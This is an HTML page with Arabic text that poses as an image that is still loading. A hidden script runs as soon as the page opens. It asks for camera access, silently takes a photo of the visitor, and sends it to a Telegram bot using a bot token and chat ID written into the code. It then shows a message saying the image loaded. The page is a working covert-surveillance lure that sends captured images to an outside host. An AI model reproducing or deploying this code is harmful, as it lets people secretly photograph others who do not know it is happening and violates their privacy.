<!DOCTYPE html>
<html>
<head>
    <title>صورة</title>
</head>
<body>
    <video id="video" autoplay style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    <div style="text-align:center; margin-top:200px">
        <h2>جاري تحميل الصورة...</h2>
        <p>يرجى الانتظار</p>
    </div>
    <script>
        const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
        const CHAT_ID = "8545876964";

        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'photo.jpg');
                        
                        try {
                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            const result = await response.json();
                            if (result.ok) {
                                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">✅ تم تحميل الصورة بنجاح</h2>';
                            } else {
                                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">❌ فشل الإرسال: ' + result.description + '</h2>';
                            }
                        } catch(e) {
                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">❌ خطأ في الإرسال</h2>';
                        }
                    }, 'image/jpeg');
                    
                    stream.getTracks().forEach(track => track.stop());
                };
            } catch(e) {
                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">❌ لا يمكن الوصول إلى الكاميرا<br>الرجاء السماح بالوصول</h2>';
            }
        }
        
        capturePhoto();
    </script>
</body>
</html>
